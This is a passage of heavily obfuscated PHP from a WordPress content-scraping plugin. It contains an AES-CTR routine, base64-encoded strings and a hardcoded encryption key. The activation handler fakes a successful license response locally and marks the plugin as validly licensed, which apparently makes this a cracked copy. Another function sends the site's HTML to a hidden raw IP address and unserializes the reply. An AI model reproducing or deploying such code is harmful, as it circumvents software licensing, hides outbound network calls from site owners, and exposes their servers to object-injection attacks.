			$rCon = array(array(0x00, 0x00, 0x00, 0x00), array(0x01, 0x00, 0x00, 0x00), array(0x02, 0x00, 0x00, 0x00), array(0x04, 0x00, 0x00, 0x00), array(0x08, 0x00, 0x00, 0x00), array(0x10, 0x00, 0x00, 0x00), array(0x20, 0x00, 0x00, 0x00), array(0x40, 0x00, 0x00, 0x00), array(0x80, 0x00, 0x00, 0x00), array(0x1b, 0x00, 0x00, 0x00), array(0x36, 0x00, 0x00, 0x00));
			$Nb = 4;
			$Nk = count($key) / 4;
			$Nr = $Nk + 6;
			$w = array();
			$temp = array();
			for ($i = 0; $i < $Nk; $i++) {
				$r = array($key[4 * $i], $key[4 * $i + 1], $key[4 * $i + 2], $key[4 * $i + 3]);
				$w[$i] = $r;
			}
			for ($i = $Nk; $i < ($Nb * ($Nr + 1)); $i++) {
				$w[$i] = array();
				for ($t = 0; $t < 4; $t++) $temp[$t] = $w[$i - 1][$t];
				if ($i % $Nk == 0) {
					$temp = tld_5bf8a856e2b89(tld_5bf8a856e2b8a($temp));
					for ($t = 0; $t < 4; $t++) $temp[$t] ^= $rCon[$i / $Nk][$t];
				} else if ($Nk > 6 && $i % $Nk == 4) {
					$temp = tld_5bf8a856e2b89($temp);
				}
				for ($t = 0; $t < 4; $t++) $w[$i][$t] = $w[$i - $Nk][$t] ^ $temp[$t];
			}
			return $w;
		}
		
		function tld_5bf8a856e2b89($w) {
			$sBox = array(0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16);
			for ($i = 0; $i < 4; $i++) {
				$w[$i] = $sBox[$w[$i]];
			}
			return $w;
		}
		
		function tld_5bf8a856e2b8a($w) {
			$tmp = $w[0];
			for ($i = 0; $i < 3; $i++) {
				$w[$i] = $w[$i + 1];
			}
			$w[3] = $tmp;
			return $w;
		}
		
		function tld_5bf8a856e2b8b($a, $b) {
			$a &= 0xffffffff;
			$b &= 0x1f;
			if ($a & 0x80000000 && $b > 0) {
				$a = ($a >> 1) & 0x7fffffff;
				$a = $a >> ($b - 1);
			} else {
				$a = ($a >> $b);
			}
			return $a;
		}
		
		function tld_JSkjKqzLMLhOe($plaintext, $password, $nBits) {
			$blockSize = 16;
			if (!($nBits == 128 || $nBits == 192 || $nBits == 256)) {
				return '';
			}
			$nBytes = $nBits / 8;
			$pwBytes = array();
			for ($i = 0; $i < $nBytes; $i++) {
				$pwBytes[$i] = ord(substr($password, $i, 1)) & 0xff;
			}
			$key = tld_5bf8a856e2b7e($pwBytes, tld_5bf8a856e2b88($pwBytes));
			$key = array_merge($key, array_slice($key, 0, $nBytes - 16));
			$counterBlock = array();
			$nonce = floor(microtime(true) * 1000);
			$nonceMs = $nonce % 1000;
			$nonceSec = floor($nonce / 1000);
			$nonceRnd = floor(rand(0, 0xffff));
			for ($i = 0; $i < 2; $i++) {
				$counterBlock[$i] = tld_5bf8a856e2b8b($nonceMs, $i * 8) & 0xff;
			}
			for ($i = 0; $i < 2; $i++) {
				$counterBlock[$i + 2] = tld_5bf8a856e2b8b($nonceRnd, $i * 8) & 0xff;
			}
			for ($i = 0; $i < 4; $i++) {
				$counterBlock[$i + 4] = tld_5bf8a856e2b8b($nonceSec, $i * 8) & 0xff;
			}
			$ctrTxt = '';
			for ($i = 0; $i < 8; $i++) {
				$ctrTxt .= chr($counterBlock[$i]);
			}
			$keySchedule = tld_5bf8a856e2b88($key);
			$blockCount = ceil(strlen($plaintext) / $blockSize);
			$ciphertxt = array();
			for ($b = 0; $b < $blockCount; $b++) {
				for ($c = 0; $c < 4; $c++) {
					$counterBlock[15 - $c] = tld_5bf8a856e2b8b($b, $c * 8) & 0xff;
				}
				for ($c = 0; $c < 4; $c++) {
					$counterBlock[15 - $c - 4] = tld_5bf8a856e2b8b($b / 0x100000000, $c * 8);
				}
				$cipherCntr = tld_5bf8a856e2b7e($counterBlock, $keySchedule);
				$blockLength = $b < $blockCount - 1 ? $blockSize : (strlen($plaintext) - 1) % $blockSize + 1;
				$cipherByte = array();
				for ($i = 0; $i < $blockLength; $i++) {
					$cipherByte[$i] = $cipherCntr[$i] ^ ord(substr($plaintext, $b * $blockSize + $i, 1));
					$cipherByte[$i] = chr($cipherByte[$i]);
				}
				$ciphertxt[$b] = implode('', $cipherByte);
			}
			$ciphertext = $ctrTxt.implode('', $ciphertxt);
			$ciphertext = base64_encode($ciphertext);
			return $ciphertext;
		}
		
		function tld_JSkjKqzLMLhOd($ciphertext, $password, $nBits) {
			$blockSize = 16;
			if (!($nBits == 128 || $nBits == 192 || $nBits == 256)) {
				return '';
			}
			$ciphertext = base64_decode($ciphertext);
			$nBytes = $nBits / 8;
			$pwBytes = array();
			for ($i = 0; $i < $nBytes; $i++) {
				$pwBytes[$i] = ord(substr($password, $i, 1)) & 0xff;
			}
			$key = tld_5bf8a856e2b7e($pwBytes, tld_5bf8a856e2b88($pwBytes));
			$key = array_merge($key, array_slice($key, 0, $nBytes - 16));
			$counterBlock = array();
			$ctrTxt = substr($ciphertext, 0, 8);
			for ($i = 0; $i < 8; $i++) {
				$counterBlock[$i] = ord(substr($ctrTxt, $i, 1));
			}
			$keySchedule = tld_5bf8a856e2b88($key);
			$nBlocks = ceil((strlen($ciphertext) - 8) / $blockSize);
			$ct = array();
			for ($b = 0; $b < $nBlocks; $b++) {
				$ct[$b] = substr($ciphertext, 8 + $b * $blockSize, 16);
			}
			$ciphertext = $ct;
			$plaintxt = array();
			for ($b = 0; $b < $nBlocks; $b++) {
				for ($c = 0; $c < 4; $c++) {
					$counterBlock[15 - $c] = tld_5bf8a856e2b8b($b, $c * 8) & 0xff;
				}
				for ($c = 0; $c < 4; $c++) {
					$counterBlock[15 - $c - 4] = tld_5bf8a856e2b8b(($b + 1) / 0x100000000 - 1, $c * 8) & 0xff;
				}
				$cipherCntr = tld_5bf8a856e2b7e($counterBlock, $keySchedule);
				$plaintxtByte = array();
				for ($i = 0; $i < strlen($ciphertext[$b]); $i++) {
					$plaintxtByte[$i] = $cipherCntr[$i] ^ ord(substr($ciphertext[$b], $i, 1));
					$plaintxtByte[$i] = chr($plaintxtByte[$i]);
				}
				$plaintxt[$b] = implode('', $plaintxtByte);
			}
			$plaintext = implode('', $plaintxt);
			return $plaintext;
		}
		
		OL_Scrapes::$PZZdMRHizwaYnOPQVKji = &OL_Scrapes::$tld;
		OL_Scrapes::$yEeeFBgupJezVduOXMiJ = &OL_Scrapes::$task_id;
	   
$GLOBALS["VrgccJkaENmdtKmdZlLy"] = base64_decode("Y291bnRfaWQ=");
$GLOBALS["awoKzzVZyzeojXqdUmYH"] = base64_decode("dXRmLTg=");
$GLOBALS["qcWWlbIleJTFhBVKTNy"] = base64_decode("J3PQsHZlXw==");
$GLOBALS["MtaHFdmfeFyVjhOZOtUN"] = base64_decode("J3NhdmVf");
$GLOBALS["oogBaJwtUBFppXiknZrU"] = base64_decode("J3NjctCwcGVf");
$GLOBALS["aJqcUbosMazArrKSyNDI"] = base64_decode("J3NjcmFwZV8=");
$GLOBALS["HTAdpberDSzGwvqUyHs"] = base64_decode("Y2xhc3Mtb2wtc2NyYXBlcy5waHA=");
$GLOBALS["lMizyCzjflrRwUXuo"] = base64_decode("Y2xhc3Nlcw==");
$GLOBALS["jiXHZAzmuNomcdlrfAfs"] = base64_decode("NTZYVnh5WmpIT04xUXp3SA==");
$GLOBALS["fqFhVsGkvPiVdAohPErM"] = base64_decode("eC1vbC1sbQ==");
$GLOBALS["OkfadEownjMPBAIaCBM"] = base64_decode("aGVhZGVycw==");
$GLOBALS["JuKBKtgtVlaJhJbcAuoA"] = base64_decode("cG9zdF9pZA==");
$GLOBALS["IstIuTeTPRiczgUCPtdI"] = base64_decode("Y2hhcnNldA==");
$GLOBALS["AcDcSamBTQTDAIhloU"] = base64_decode("RjIwMjQyNjU4M0RGMjM4M0RGNDI5MkI1QzBEODY0NDIwOUUwQzU5MEFBOEQ5MDA5RDE1MjZGMDRGOTc0ODRERA==");
$GLOBALS["DVISCehODQFejSmKVCjs"] = base64_decode("IjsgZmlsZW5hbWU9Ig==");
$GLOBALS["ZsPeaKlxuSXtoqftcKzx"] = base64_decode("ZmlsZQ==");
$GLOBALS["zRsHBLfNftPAENmUZAjV"] = base64_decode("Ig==");
$GLOBALS["IqBAhfJmWBBOjUuPGwnk"] = base64_decode("Q29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSI=");
$GLOBALS["afHylBhWUaoKuuVvSQkC"] = base64_decode("LS0=");
$GLOBALS["YNjUhBOYSprJdWbkxEHu"] = base64_decode("aHR0cHM6Ly90cmFuc2xhdGUuZ29vZ2xlLmNvbS8=");
$GLOBALS["iRmARCJFkUoyiLZRovyc"] = base64_decode("UmVmZXJlcg==");
$GLOBALS["AADynVMRpmEPeBtwUsgH"] = base64_decode("bXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9");
$GLOBALS["tbBHeOHDcXieuFsCFlVj"] = base64_decode("Q29udGVudC1UeXBl");
$GLOBALS["UMpbgahGSOYgMyohvDff"] = base64_decode("bnVtX3RhZ3M=");
$GLOBALS["KJsbahNWDDylnoMofCYh"] = base64_decode("c3Ry");
$GLOBALS["qoSQcyENqRCFhCCwzAxA"] = base64_decode("aHRtbF9zdHJpbmc=");
$GLOBALS["oxgiuTjjumUnmsxasFkR"] = base64_decode("aHR0cDovLzIzLjIzOS44LjExMy93cC1qc29uL29sX2xtL3YxL3RyYW5zbGF0ZV9zdHJpbmc=");
$GLOBALS["tVVIUhcCdVbsxETTXpcK"] = base64_decode("dys=");
$GLOBALS["UCrlwpDqrrMuacxBTAPW"] = base64_decode("LnR4dA==");
$GLOBALS["MbajDNJRhmMOwGojscvU"] = base64_decode("Xw==");
$GLOBALS["ViogKoPpfMgwLVOnOiNS"] = base64_decode("L3RtcF9zY3JhcGVzX3RyYW5zbGF0ZV8=");
$GLOBALS["QeYyxGarRhthJMWArRkd"] = base64_decode("YmFzZWRpcg==");
$GLOBALS["NjcXHkZebEDoArAyomxk"] = base64_decode("aHR0cHM6Ly90cmFuc2xhdGUuZ29vZ2xldXNlcmNvbnRlbnQuY29tL3RyYW5zbGF0ZV9m");
$GLOBALS["IloTkTvTEIjCOwgVGsOB"] = base64_decode("VVRGIC0gOA==");
$GLOBALS["fOcaHKHCoPrPHePwebYZ"] = base64_decode("aWU=");
$GLOBALS["wpBsCmkCDhtyhJRXOBjg"] = base64_decode("ZW4=");
$GLOBALS["DFhtDepPbCJWKPCXTOAl"] = base64_decode("aGw=");
$GLOBALS["UIvvzRvllEdRhxlerukh"] = base64_decode("X3Q=");
$GLOBALS["YQwAgRlUJqWNfJTabpnr"] = base64_decode("cHJldg==");
$GLOBALS["TuHrLTbkMmVoEThqYCLj"] = base64_decode("eQ==");
$GLOBALS["BIRxDEtKlOkjNWyUsLdz"] = base64_decode("anM=");
$GLOBALS["VfGVbSyEnzGqvXXOIwoc"] = base64_decode("dGw=");
$GLOBALS["IkpVOtaTynesCFKaRNvs"] = base64_decode("c2w=");
$GLOBALS["QLAMaGOdUMJgbBUhQgfM"] = base64_decode("ZWRpdC5waHA=");
$GLOBALS["DQdFWfsMQJdxnLVGxKDE"] = base64_decode("c3VjY2Vzcw==");
$GLOBALS["zuQzlZcvmvaHOfaQFXfw"] = base64_decode("c2NyYXBl");
$GLOBALS["IZetFtutVGxJkApOsdJU"] = base64_decode("cG9zdF90eXBl");
$GLOBALS["unawapIMUxScaSdPwWjE"] = base64_decode("c2NyYXBlcy1zZXR0aW5ncw==");
$GLOBALS["JhRZMuEYHkOmqfZIUmbR"] = base64_decode("cGFnZQ==");
$GLOBALS["TyniamuAQZWLhWIdhQtn"] = base64_decode("c2NyYXBlX21zZ19zZXQ=");
$GLOBALS["gBqmKEUPvaZefRqCjOWZ"] = base64_decode("c2NyYXBlX21zZ19zZXRfc3VjY2Vzcw==");
$GLOBALS["TuadPxTVLpNPULXLHQ"] = base64_decode("b2xfc2NyYXBlc19wYw==");
$GLOBALS["YkFMrCQVeuNajkDaAYNV"] = base64_decode("b2xfc2NyYXBlc19kb21haW4=");
$GLOBALS["QNbuXTIjDkqvxlAbpPGo"] = base64_decode("b2xfc2NyYXBlc192YWxpZA==");
$GLOBALS["KtnVMZUhQnOyibNdYKxx"] = base64_decode("X211bHRpd2lkZ2V0");
$GLOBALS["WMiaBJzauvzweonOHwAZ"] = base64_decode("d2lkZ2V0X21lZGlhX2NvcmU=");
$GLOBALS["IkGmljSoKknOauFDavdw"] = base64_decode("b2xfc2NyYXBlcw==");
$GLOBALS["TgvhfQFnRqefyPBmZE"] = base64_decode("cHJvZHVjdA==");
$GLOBALS["SbOfvrqpjHCHPakKjioh"] = base64_decode("cmVxdWVzdF9kb21haW4=");
$GLOBALS["aIiaqMvvijunkPWKmgt"] = base64_decode("aHR0cDovLw==");
$GLOBALS["vZJLBXUeTtjqAFsGhALd"] = base64_decode("c3VibWl0");
$GLOBALS["kvBctTPAbRshgOfJxIBp"] = base64_decode("Ym9keQ==");
$GLOBALS["yszlVhBJXrEseoqgLJzv"] = base64_decode("dGltZW91dA==");
$GLOBALS["pEjYGZDBNRIgNzIVmufg"] = base64_decode("JC8=");
$GLOBALS["ccUrYbodzvhvLFBVARw"] = base64_decode("ezEsM30v");
$GLOBALS["kvBvtTPebRsfOfJxIBp"] = base64_decode("cGNvZGU=");
$GLOBALS["MIWDopNoGvknhRoYrPQt"] = base64_decode("ezEsM30=");
$GLOBALS["JsPuQXopAGHsqRwURiUS"] = base64_decode("Lw==");
$GLOBALS["gjstubZmVoLQSEdelnxY"] = base64_decode("XSskLw==");
$GLOBALS["SHJuGYSUTfNcOXYMvxEk"] = base64_decode("W14=");
$GLOBALS["XDlKylzAEKbuMEDalkAt"] = base64_decode("XSs=");
$GLOBALS["SnsSSwMKZSYeMFnEirnh"] = base64_decode("");
$GLOBALS["xipXKEenoXNdtKQhQLCV"] = base64_decode("L1te");
$GLOBALS["VoXrzgBcLkBTKuXMeFXN"] = base64_decode("aG9zdA==");
$GLOBALS["CWTxJcZDGWCzlFgENdo"] = base64_decode("ZG9tYWlu");
$GLOBALS["ZAPyAfGfBTTmqkGLXbNy"] = base64_decode("cHVyY2hhc2VfY29kZQ==");
$GLOBALS["SYNoScCQmfCSzRWuFJHC"] = base64_decode("MTI3LjAuMC4x");
$GLOBALS["txPLEWBoWOzmhiyLOUdE"] = base64_decode("bG9jYWxob3N0");
$GLOBALS["kXrVXfHjGYFqpuUELIJS"] = base64_decode("c2NyYXBlc19zZXR0aW5ncw==");
$GLOBALS["QheEXXDMDLdWGFqqvtnw"] = base64_decode("b2xfcmVtb3ZlX3Bj");
$GLOBALS["hFUNhCDpcmbSgcwfcaFf"] = base64_decode("YWRtaW5fcG9zdF9yZW1vdmVfcGM=");
$GLOBALS["BKUjqdBPsQvPzvzhrvjg"] = base64_decode("b2xfYWRkX3Bj");
$GLOBALS["YmSMFrVIuikDiJdqYsfz"] = base64_decode("YWRtaW5fcG9zdF9zYXZlX3NjcmFwZXNfc2V0dGluZ3M=");
function wp_load_template()
{
    add_action($GLOBALS["YmSMFrVIuikDiJdqYsfz"], $GLOBALS["BKUjqdBPsQvPzvzhrvjg"]);
    add_action($GLOBALS["hFUNhCDpcmbSgcwfcaFf"], $GLOBALS["QheEXXDMDLdWGFqqvtnw"]);
}
function ol_add_pc()
{
    global $translates;
    check_admin_referer($GLOBALS["kXrVXfHjGYFqpuUELIJS"]);
    $oxGrDjzpMSZBkeYeFXoz = array(
        "localhost",
        "127.0.0.1"
    );
    $lVEsojbOAXssZrcoTAkS = $_POST[$GLOBALS["ZAPyAfGfBTTmqkGLXbNy"]];
    $pjcLAkhFuzyDlwgeJQuh = parse_url($_POST[$GLOBALS["CWTxJcZDGWCzlFgENdo"]]);
    $pjcLAkhFuzyDlwgeJQuh = $pjcLAkhFuzyDlwgeJQuh[$GLOBALS["VoXrzgBcLkBTKuXMeFXN"]];
    $PZZdMRHizwaYnOPQVKji = OL_Scrapes::$PZZdMRHizwaYnOPQVKji;
    $noXNgyBJkzskxYHhoqtf = parse_url(get_site_url());
    $noXNgyBJkzskxYHhoqtf = $noXNgyBJkzskxYHhoqtf[$GLOBALS["VoXrzgBcLkBTKuXMeFXN"]];
    $nzSQsYcFKORgCYKjwdbp = null;
    preg_match($GLOBALS["xipXKEenoXNdtKQhQLCV"] . "\." . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\/" . $GLOBALS["XDlKylzAEKbuMEDalkAt"] . "\." . $GLOBALS["SHJuGYSUTfNcOXYMvxEk"] . "\." . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\/" . $GLOBALS["gjstubZmVoLQSEdelnxY"], $noXNgyBJkzskxYHhoqtf, $nzSQsYcFKORgCYKjwdbp);
    if (!empty($nzSQsYcFKORgCYKjwdbp) && !preg_match($GLOBALS["JsPuQXopAGHsqRwURiUS"] . "\d" . $GLOBALS["MIWDopNoGvknhRoYrPQt"] . "\." . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\d" . $GLOBALS["ccUrYbodzvhvLFBVARw"], $nzSQsYcFKORgCYKjwdbp[0]))
    {
        foreach ($PZZdMRHizwaYnOPQVKji as $XYVhOlbBJOOjzmJXRDNy)
        {
            if (preg_match($GLOBALS["JsPuQXopAGHsqRwURiUS"] . "\." . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . preg_quote($XYVhOlbBJOOjzmJXRDNy) . $GLOBALS["pEjYGZDBNRIgNzIVmufg"], $noXNgyBJkzskxYHhoqtf))
            {
                preg_match($GLOBALS["xipXKEenoXNdtKQhQLCV"] . "\." . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\/" . $GLOBALS["XDlKylzAEKbuMEDalkAt"] . "\." . $GLOBALS["SHJuGYSUTfNcOXYMvxEk"] . "\." . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\/" . $GLOBALS["XDlKylzAEKbuMEDalkAt"] . "\." . $GLOBALS["SHJuGYSUTfNcOXYMvxEk"] . "\." . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\/" . $GLOBALS["gjstubZmVoLQSEdelnxY"], $noXNgyBJkzskxYHhoqtf, $nzSQsYcFKORgCYKjwdbp);
            }
        }
        $noXNgyBJkzskxYHhoqtf = $nzSQsYcFKORgCYKjwdbp[0];
    }
    if (($pjcLAkhFuzyDlwgeJQuh == $noXNgyBJkzskxYHhoqtf) || in_array($noXNgyBJkzskxYHhoqtf, $oxGrDjzpMSZBkeYeFXoz))
    {
        $BdlbpgzPBjxVLkBLnsrX = new stdClass();
        $BdlbpgzPBjxVLkBLnsrX->$GLOBALS["kvBvtTPebRsfOfJxIBp"] = 'QheEXXDMDLdWGFqqvtnw';
        $BdlbpgzPBjxVLkBLnsrX->$GLOBALS["kvBctTPAbRshgOfJxIBp"] = 'WMiaBJzauvzweonOHwAZ';
        $BdlbpgzPBjxVLkBLnsrX = json_encode($BdlbpgzPBjxVLkBLnsrX);

            $BdlbpgzPBjxVLkBLnsrX = json_decode($BdlbpgzPBjxVLkBLnsrX);
            if (!empty($BdlbpgzPBjxVLkBLnsrX->error_msg))
            {
                $GfNOeQGoTKggozAbXZAU = $translates[$BdlbpgzPBjxVLkBLnsrX->error_msg];
            }
            if ($BdlbpgzPBjxVLkBLnsrX && !$BdlbpgzPBjxVLkBLnsrX->error)
            {
                $FOsUOUtZwoSGdnCSQqhY = get_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
                $FOsUOUtZwoSGdnCSQqhY = json_decode(tld_JSkjKqzLMLhOd($FOsUOUtZwoSGdnCSQqhY[$GLOBALS["KtnVMZUhQnOyibNdYKxx"]], password() , 256));
                $TQxOVoWpdkRTxPQyWBVm = $FOsUOUtZwoSGdnCSQqhY[0];
                if ($TQxOVoWpdkRTxPQyWBVm !== 0)
                {
                    $INgShcwdFZsgPBHMYbUl = $TQxOVoWpdkRTxPQyWBVm;
                }
                else
                {
                    $INgShcwdFZsgPBHMYbUl = 0;
                }
                update_site_option($GLOBALS["QNbuXTIjDkqvxlAbpPGo"], 1);
                update_site_option($GLOBALS["YkFMrCQVeuNajkDaAYNV"], $pjcLAkhFuzyDlwgeJQuh);
                update_site_option($GLOBALS["TuadPxTVLpNPULXLHQ"], $lVEsojbOAXssZrcoTAkS);
                delete_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"]);
                update_site_option($GLOBALS["WMiaBJzauvzweonOHwAZ"], array(
                    "_multiwidget" => tld_JSkjKqzLMLhOe(json_encode(array(
                        $INgShcwdFZsgPBHMYbUl,
                        $pjcLAkhFuzyDlwgeJQuh,
                        $lVEsojbOAXssZrcoTAkS,
                    )) , password() , 256)
                ));
                $UVofLJtxBqtAMlEvQNY = 1;
            }
            else
            {
                $UVofLJtxBqtAMlEvQNY = 0;
            }
        
    }
    else
    {
        $GfNOeQGoTKggozAbXZAU = $translates[1];
        $UVofLJtxBqtAMlEvQNY = 0;
    }
    if ($UVofLJtxBqtAMlEvQNY)
    {
        set_transient($GLOBALS["gBqmKEUPvaZefRqCjOWZ"], array(
            $translates[2]
        ));
    }
    else
    {
        set_transient($GLOBALS["TyniamuAQZWLhWIdhQtn"], array(
            $GfNOeQGoTKggozAbXZAU
        ));
    }
    wp_redirect(add_query_arg(array(
        $GLOBALS["JhRZMuEYHkOmqfZIUmbR"] => $GLOBALS["unawapIMUxScaSdPwWjE"],
        $GLOBALS["IZetFtutVGxJkApOsdJU"] => $GLOBALS["zuQzlZcvmvaHOfaQFXfw"],
        $GLOBALS["DQdFWfsMQJdxnLVGxKDE"] => $UVofLJtxBqtAMlEvQNY
    ) , admin_url($GLOBALS["QLAMaGOdUMJgbBUhQgfM"])));
    exit;
}
function wp_check_url()
{
    global $post_fields;
    global $api;
    global $payload;
    global $headers;
    global $from_language;
    global $to_language;
    global $html_string;
    global $tags_numbers_match;
    if (ol_check_offline())
    {
        $post_fields = array(
            "sl" => $from_language,
            "tl" => $to_language,
            "js" => "y",
            "prev" => "_t",
            "hl" => "en",
            "ie" => "UTF - 8"
        );
        $api = $GLOBALS["NjcXHkZebEDoArAyomxk"];
        $IznIADhRogIAaKCaBpNq = wp_upload_dir();
        $BomEMWrEKOYNnLttoNlo = $IznIADhRogIAaKCaBpNq[$GLOBALS["QeYyxGarRhthJMWArRkd"]] . $GLOBALS["ViogKoPpfMgwLVOnOiNS"] . get_current_blog_id() . $GLOBALS["MbajDNJRhmMOwGojscvU"] . ol_scrapes::$yEeeFBgupJezVduOXMiJ . $GLOBALS["UCrlwpDqrrMuacxBTAPW"];
        $CabApRGvevqOquXpVYwP = fopen($BomEMWrEKOYNnLttoNlo, $GLOBALS["tVVIUhcCdVbsxETTXpcK"]);
        $DsbRUFSXgCUKlLAaGbzE = wp_remote_post($GLOBALS["oxgiuTjjumUnmsxasFkR"], array(
            "timeout" => 60,
            "body" => array(
                "html_string" => $html_string
            )
        ));
        $GKhMJYeoDAHjxjZAlmHt = json_decode(wp_remote_retrieve_body($DsbRUFSXgCUKlLAaGbzE) , true);
        $html_string = $GKhMJYeoDAHjxjZAlmHt[$GLOBALS["KJsbahNWDDylnoMofCYh"]];
        $tags_numbers_match = unserialize($GKhMJYeoDAHjxjZAlmHt[$GLOBALS["UMpbgahGSOYgMyohvDff"]]);
        fwrite($CabApRGvevqOquXpVYwP, trim(html_entity_decode($html_string)));
        fclose($CabApRGvevqOquXpVYwP);
        $LbjCLVHSljNEotNCUBcB = wp_generate_password(24);
        $headers = array(
            "Content-Type" => "multipart/form-data; boundary=" . $LbjCLVHSljNEotNCUBcB,
            "Referer" => "https://translate.google.com/"
        );
        foreach ($post_fields as $aumZVSoNLcoUiryLdkex => $ytnxJjQqCvGdNRBKCigc)
        {
            $payload .= $GLOBALS["afHylBhWUaoKuuVvSQkC"] . $LbjCLVHSljNEotNCUBcB;
            $payload .= $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\r" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\n" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"];
            $payload .= $GLOBALS["IqBAhfJmWBBOjUuPGwnk"] . $aumZVSoNLcoUiryLdkex . $GLOBALS["zRsHBLfNftPAENmUZAjV"] . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\r" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\n" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\r" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\n" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"];
            $payload .= $ytnxJjQqCvGdNRBKCigc;
            $payload .= $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\r" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\n" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"];
        }
        if ($BomEMWrEKOYNnLttoNlo)
        {
            $payload .= $GLOBALS["afHylBhWUaoKuuVvSQkC"] . $LbjCLVHSljNEotNCUBcB;
            $payload .= $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\r" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\n" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"];
            $payload .= $GLOBALS["IqBAhfJmWBBOjUuPGwnk"] . $GLOBALS["ZsPeaKlxuSXtoqftcKzx"] . $GLOBALS["DVISCehODQFejSmKVCjs"] . basename($BomEMWrEKOYNnLttoNlo) . $GLOBALS["zRsHBLfNftPAENmUZAjV"] . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\r" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\n" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"];
            $payload .= $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\r" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\n" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"];
            $payload .= file_get_contents($BomEMWrEKOYNnLttoNlo);
            $payload .= $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\r" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"] . "\n" . $GLOBALS["SnsSSwMKZSYeMFnEirnh"];
        }
        $payload .= $GLOBALS["afHylBhWUaoKuuVvSQkC"] . $LbjCLVHSljNEotNCUBcB . $GLOBALS["afHylBhWUaoKuuVvSQkC"];
    }
    else
    {
        return;
    }
}
function password()
{
    return $GLOBALS["AcDcSamBTQTDAIhloU"];
}
function detect_html_charset()
{
    global $charset_header;
    global $charset_php;
    global $charset_meta;
    if (ol_check_offline())
    {
        if ($charset_header && $charset_meta)
        {
            return $charset_header;
        }
        if (!$charset_header && !$charset_meta)
        {
            return $charset_php;
        }
        else
        {
            return !empty($charset_meta) ? $charset_meta : $charset_header;
        }
    }
    else
    {
        return $GLOBALS["IstIuTeTPRiczgUCPtdI"];
    }
}
function clean_post_meta()
{
    global $meta_vals;
